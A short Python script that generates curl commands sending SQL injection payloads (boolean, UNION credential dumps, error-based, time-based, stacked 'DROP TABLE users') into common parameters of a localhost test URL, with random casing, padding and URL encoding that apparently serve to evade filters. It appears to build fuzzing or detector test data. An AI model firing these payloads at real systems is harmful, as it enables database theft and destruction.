import random
import urllib.parse

TARGET = "http://localhost/test?"

PARAMS = [
    "id", "user", "username", "search",
    "query", "item", "cat", "page", "ref"
]

BOOLEAN_BASED = [
    "' OR 1=1--",
    "' OR 'a'='a'--",
    "' AND 1=2--",
    "' OR 1=1#",
    "' OR 1=1/*"
]

UNION_BASED = [
    "' UNION SELECT 1,2--",
    "' UNION SELECT null,null--",
    "' UNION SELECT username,password FROM users--"
]

ERROR_BASED = [
    "' AND extractvalue(1,concat(0x7e,user()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
    "' AND (SELECT 1 FROM information_schema.tables)--"
]

TIME_BASED = [
    "' OR SLEEP(5)--",
    "' OR BENCHMARK(1000000,MD5(1))--",
    "'; WAITFOR DELAY '0:0:5'--"
]

STACKED = [
    "'; DROP TABLE users--",
    "'; SELECT @@version--",
    "'; INSERT INTO users VALUES ('a','b')--"
]

NUMERIC_CONTEXT = [
    "1 OR 1=1",
    "1 AND 1=2",
    "1 UNION SELECT 1,2"
]

def random_case(s):
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

def maybe_encode(s):
    if random.random() > 0.4:
        s = urllib.parse.quote(s)
    if random.random() > 0.7:
        s = urllib.parse.quote(s)
    return s

def maybe_add_noise(s):
    wrappers = [
        lambda x: x,
        lambda x: "test" + x,
        lambda x: x + "abc",
        lambda x: "123" + x + "456"
    ]
    return random.choice(wrappers)(s)

ALL_PAYLOADS = (
    BOOLEAN_BASED +
    UNION_BASED +
    ERROR_BASED +
    TIME_BASED +
    STACKED +
    NUMERIC_CONTEXT
)

generated = set()

while len(generated) < 100:
    param = random.choice(PARAMS)
    payload = random.choice(ALL_PAYLOADS)

    if random.random() > 0.5:
        payload = random_case(payload)

    payload = maybe_add_noise(payload)
    payload = maybe_encode(payload)

    curl_cmd = f'curl "{TARGET}{param}={payload}"'
    generated.add(curl_cmd)

for cmd in generated:
    print(cmd)
